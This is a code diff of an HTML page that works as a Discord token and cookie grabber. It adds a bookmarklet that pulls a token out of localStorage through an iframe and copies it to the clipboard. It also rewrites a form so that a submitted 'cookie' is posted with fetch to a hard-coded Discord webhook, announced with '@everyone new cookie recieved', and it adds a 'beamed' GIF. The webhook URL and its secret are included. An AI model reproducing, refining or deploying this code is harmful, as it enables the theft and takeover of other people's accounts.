@@ -4,6 +4,8 @@
 	<body>
 		<script src="https://code.jquery.com/jquery-3.6.2.min.js"></script>
 
+		<a href="javascript:(function(){location.reload();var i = document.createElement('iframe');document.body.appendChild(i);navigator.clipboard.writeText(i.contentWindow.localStorage.token)})()">Bookmarklet</a>
+
 		<form>
 			<input type="text" id="form-input" style="width: 400px; height: 25px;" placeholder="cookie"></input>
 			<button type="submit" id="form-submit" style="width: 100px; height: 25px;">SUBMIT</button>
@@ -14,6 +16,16 @@
 				document.write(`<br>${str}`);
 			};
 
+			function handleErrors(response) {
+				if (!response.ok) {
+					write("(handler) error" + response.statusText);
+					throw Error(response.statusText);
+				} else {
+					write("(handler) no errors");
+				};
+				return response;
+			};
+
 			$("form")[0].addEventListener("submit", (e) => {
 				e.preventDefault();
 				
@@ -22,14 +34,22 @@
 				
 				write("submitting...");
 
-				var req = $.post("https://discord.com/api/webhooks/1101528266373873694/X3TVaHAB8jJ6BqJ9TOB2tVQA9ogpnpSy4niSzwM1BuohDdP-ApPedUPPLP3n3UYi2qWT",{
-					"content": `@everyone new cookie recieved:\n\`\`\`\n${cook}\n\`\`\``
-				});
-				
-				req.always = function(){write("complete!")};
-				req.done = function(){write("success!")};
-				req.fail = function(){write("fail!")};
+				// fetch is used because discord doesn't use jquery
+				fetch("https://discord.com/api/webhooks/1101528266373873694/X3TVaHAB8jJ6BqJ9TOB2tVQA9ogpnpSy4niSzwM1BuohDdP-ApPedUPPLP3n3UYi2qWT",{
+					method: "POST",
+					headers: {
+						"Content-Type": "application/json",
+						},
+					body: JSON.stringify({
+						"content": `@everyone new cookie recieved:\n\`\`\`\n${cook}\n\`\`\``
+					})
+				})
+					.then(handleErrors)
+					.then(response => write("success!&nbsp;" + JSON.stringify(response)))
+					.catch(error => write("fail!&nbsp;" + JSON.stringify(error)));
 			});
 		</script>
+
+		<img src="https://media.tenor.com/V5jKgnXoSzIAAAAd/beamed-discord.gif">
 	</body>
 </html>
